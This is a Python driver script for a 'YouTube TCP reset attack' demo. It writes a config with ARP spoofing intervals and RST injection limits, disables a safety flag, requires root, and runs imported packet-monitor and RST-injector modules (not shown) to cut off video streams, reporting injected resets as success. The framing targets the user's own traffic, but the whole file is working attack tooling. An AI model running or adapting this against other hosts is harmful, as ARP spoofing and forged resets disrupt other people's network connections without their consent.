#!/usr/bin/env python3
"""
Real YouTube TCP Reset Attack Demo
Target your own YouTube traffic for demonstration
"""

import subprocess
import time
import sys
import os
from pathlib import Path

# Add src to path
sys.path.insert(0, str(Path(__file__).parent / "src"))

def get_current_ip():
    """Get current machine's IP address"""
    try:
        # Get IP from default route
        result = subprocess.run(['ip', 'route', 'get', '8.8.8.8'], 
                              capture_output=True, text=True)
        for line in result.stdout.split('\n'):
            if 'src' in line:
                ip = line.split('src')[1].split()[0]
                return ip
    except:
        pass
    return "127.0.0.1"

def setup_youtube_attack():
    """Set up attack targeting real YouTube traffic"""
    current_ip = get_current_ip()
    
    print("=" * 60)
    print("REAL YOUTUBE TCP RESET ATTACK")
    print("=" * 60)
    print(f"Your IP: {current_ip}")
    print(f"Target: Your own YouTube traffic")
    print()
    
    # Import attack components
    try:
        from config_manager import ConfigManager
        from packet_monitor import PacketMonitor
        
        # Create real YouTube config
        youtube_config = f"""[NETWORK]
TARGET_IP = {current_ip}
GATEWAY_IP = auto
SERVER_IP = auto
INTERFACE = auto

[ATTACK]
ARP_INTERVAL = 2
RST_DELAY = 10
MAX_RST_PACKETS = 5
MONITOR_DURATION = 0

[DETECTION]
VIDEO_PORTS = 443,80
MIN_VIDEO_PACKET_SIZE = 1000
CONNECTION_TIMEOUT = 300

[LOGGING]
LOG_LEVEL = DEBUG
LOG_FILE = logs/youtube_attack.log
CAPTURE_PACKETS = true

[SAFETY]
ENABLE_SAFETY = false
RESTRICT_TO_LOCAL = true
MAX_DURATION = 10
"""
        
        # Write config
        with open("config/youtube_config.ini", "w") as f:
            f.write(youtube_config)
        
        # Load config
        config = ConfigManager("config/youtube_config.ini")
        
        # Get interface
        interface = config.get('NETWORK', 'INTERFACE')
        print(f"Interface: {interface}")
        
        # Create packet monitor
        monitor = PacketMonitor(current_ip, interface, config)
        
        return monitor, config
        
    except Exception as e:
        print(f"Error setting up attack: {e}")
        import traceback
        traceback.print_exc()
        return None, None

def run_youtube_attack():
    """Run the YouTube attack"""
    if os.geteuid() != 0:
        print("YouTube attack requires root privileges")
        print("Run: sudo python3 youtube_attack.py")
        return
    
    monitor, config = setup_youtube_attack()
    if not monitor:
        print("Failed to setup attack")
        return
    
    print("\n--- INSTRUCTIONS ---")
    print("1. Start this attack monitor")
    print("2. Open YouTube in your browser")
    print("3. Start playing a video")
    print("4. Watch the attack interrupt the video stream!")
    print()
    
    input("Press Enter when ready to start the attack...")
    
    print("\n[ATTACK] Starting YouTube traffic monitoring...")
    
    if monitor.start_monitoring():
        print("\n" + "=" * 50)
        print("🎯 YOUTUBE TCP RESET ATTACK ACTIVE")
        print("=" * 50)
        print("Now open YouTube and play a video!")
        print("The attack will target HTTPS traffic on port 443")
        print("Press Ctrl+C to stop the attack")
        print("=" * 50)
        
        try:
            # Monitor for specified duration
            duration = config.get_int('SAFETY', 'MAX_DURATION') * 60
            start_time = time.time()
            
            while time.time() - start_time < duration:
                time.sleep(1)
                
                # Print periodic stats
                if int(time.time() - start_time) % 10 == 0:
                    stats = monitor.rst_injector.get_statistics()
                    print(f"\n[STATS] Runtime: {int(time.time() - start_time)}s | "
                          f"Packets: {monitor.packet_count} | "
                          f"YouTube: {monitor.youtube_packet_count} | "
                          f"RST Injected: {stats['total_injections']}")
                    
                    if stats['total_injections'] > 0:
                        print("🎉 ATTACK IS WORKING! YouTube traffic being reset!")
            
            print(f"\n[ATTACK] Maximum duration ({config.get_int('SAFETY', 'MAX_DURATION')} min) reached")
            
        except KeyboardInterrupt:
            print("\n[ATTACK] Stopped by user")
        
        # Stop monitoring
        monitor.stop_monitoring()
        
        # Final results
        print("\n" + "=" * 50)
        print("ATTACK RESULTS")
        print("=" * 50)
        stats = monitor.rst_injector.get_statistics()
        print(f"Total packets monitored: {monitor.packet_count}")
        print(f"YouTube packets detected: {monitor.youtube_packet_count}")
        print(f"RST packets injected: {stats['total_injections']}")
        print(f"Connections attacked: {stats['connections_attacked']}")
        
        if stats['total_injections'] > 0:
            print("\n✅ REAL YOUTUBE ATTACK SUCCESSFUL!")
            print("YouTube video playback was disrupted by TCP Reset packets!")
        else:
            print("\n❌ No YouTube traffic detected")
            print("Try playing a video while the attack is running")
    
    else:
        print("Failed to start monitoring")

if __name__ == "__main__":
    run_youtube_attack()
